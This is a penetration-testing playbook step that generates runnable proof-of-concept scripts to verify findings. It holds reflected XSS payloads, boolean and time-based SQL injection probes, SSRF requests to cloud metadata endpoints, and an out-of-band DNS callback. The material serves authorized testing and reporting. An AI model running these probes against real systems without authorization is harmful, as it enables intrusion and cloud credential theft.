# Reporting — Verify (PoC Generation)

## Purpose
Generate self-contained, runnable proof-of-concept scripts for each finding. Create curl one-liners, Python requests scripts, and HTML demo pages for XSS/CSRF scenarios. Every PoC must be independently executable and reproducible.

## Required Variables
- `$TARGET_URL`: full URL of the vulnerable endpoint
- `$EVIDENCE_DIR`: where PoC artifacts are stored
- `$FINDING_TITLE`: title of the finding
- `$SEVERITY`: severity label

## Commands

```bash
mkdir -p "$EVIDENCE_DIR"

PAYLOAD_SVG='<svg/onload=alert(1)>'
cat > "$EVIDENCE_DIR/poc_xss.sh" << 'SHEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
echo "[*] Testing reflected XSS on $TARGET_URL"
curl -s -G "$TARGET_URL" --data-urlencode "q=<svg/onload=alert(1)>" | grep -i '<svg' && echo "[+] Reflected XSS confirmed" || echo "[-] Payload not reflected"
echo "[*] Testing with img tag:"
curl -s -G "$TARGET_URL" --data-urlencode "q=<img src=x onerror=alert(1)>" | grep -i '<img src=x' && echo "[+] Reflected XSS confirmed" || echo "[-] Payload not reflected"
SHEOF
chmod +x "$EVIDENCE_DIR/poc_xss.sh"

cat > "$EVIDENCE_DIR/poc_sqli.sh" << 'SHEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
echo "[*] Testing SQLi on $TARGET_URL"
curl -s -G "$TARGET_URL" --data-urlencode "id=1' OR '1'='1" | wc -c | xargs echo "Response size (bytes):"
curl -s -G "$TARGET_URL" --data-urlencode "id=1'" | wc -c | xargs echo "Response size with single quote (bytes):"
echo "[*] Testing time-based:"
curl -s -o /dev/null -w "Response time: %{time_total}s\n" -G "$TARGET_URL" --data-urlencode "id=1' AND SLEEP(5)-- "
SHEOF
chmod +x "$EVIDENCE_DIR/poc_sqli.sh"

cat > "$EVIDENCE_DIR/poc_ssrf.sh" << 'SHEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
echo "[*] Testing SSRF on $TARGET_URL"
curl -s -w "\nHTTP %{http_code} | Time: %{time_total}s\n" "$TARGET_URL?url=http://169.254.169.254/latest/meta-data/"
curl -s -w "\nHTTP %{http_code} | Time: %{time_total}s\n" "$TARGET_URL?url=http://metadata.google.internal/"
echo "[*] Testing DNS callback via interactsh:"
curl -s "$TARGET_URL?url=http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).oastify.com" -o /dev/null
SHEOF
chmod +x "$EVIDENCE_DIR/poc_ssrf.sh"

python3 - "$TARGET_URL" "$EVIDENCE_DIR/poc_requests.py" << 'PYEOF'
import sys
target = sys.argv[1]
outfile = sys.argv[2]
code = f'''#!/usr/bin/env python3
import requests
import sys

TARGET = "{target}"

def test_xss():
    payloads = ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    for p in payloads:
        r = requests.get(TARGET, params={{"q": p}}, timeout=10)
        if p in r.text:
            print(f"[+] XSS confirmed with payload: {{p}} (status={{r.status_code}})")
            return True
    print("[-] No XSS payload reflected")
    return False

def test_sqli():
    payloads = [("1' OR '1'='1", "boolean"), ("1' AND SLEEP(3)-- ", "time")]
    for p, ptype in payloads:
        try:
            r = requests.get(TARGET, params={{"id": p}}, timeout=15)
            print(f"[*] SQLi ({{ptype}}): status={{r.status_code}}, size={{len(r.text)}}")
        except requests.exceptions.Timeout:
            print(f"[+] Time-based SQLi confirmed (request timed out)")
            return True
    return False

if __name__ == "__main__":
    print(f"PoC against {{TARGET}}")
    print("=" * 50)
    test_xss()
    test_sqli()
'''
with open(outfile, 'w') as fh:
    fh.write(code)
print(f"Wrote self-contained PoC to {outfile}")
PYEOF

chmod +x "$EVIDENCE_DIR/poc_requests.py"

cat > "$EVIDENCE_DIR/xss_demo.html" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>XSS PoC Demo</title></head>
<body>
<h2>Proof of Concept — Cross-Site Scripting</h2>
<p>Vulnerable endpoint: <code id="target"></code></p>
<p><strong>Payload:</strong> <code>&lt;svg/onload=alert(1)&gt;</code></p>
<button onclick="fire()">Replay Payload</button>
<iframe id="frame" style="width:100%;height:200px;border:1px solid #ccc;"></iframe>
<script>
document.getElementById('target').textContent = new URLSearchParams(location.search).get('url') || 'TARGET_URL';
function fire() {
  var u = document.getElementById('target').textContent;
  document.getElementById('frame').src = u + '?q=%3Csvg/onload=alert(1)%3E';
}
</script>
</body>
</html>
HTMLEOF

echo "Generated PoC artifacts:"
ls -la "$EVIDENCE_DIR"/poc_*
```

## Detection Signals
- `bash poc_xss.sh` exits non-zero only on genuine failure (not on "not reflected")
- Python PoC is valid syntax: `python3 -c "import ast; ast.parse(open('$EVIDENCE_DIR/poc_requests.py').read()); print('OK')"`
- HTML demo page renders without CSP errors in browser
- All PoC scripts are executable

## Next
├── If PoCs generated → `04-impact-escalation.md`
├── If PoC fails to reproduce → re-examine finding, flag as potential false positive
└── If manual interaction needed (Stored XSS, Blind SQLi) → annotate with manual steps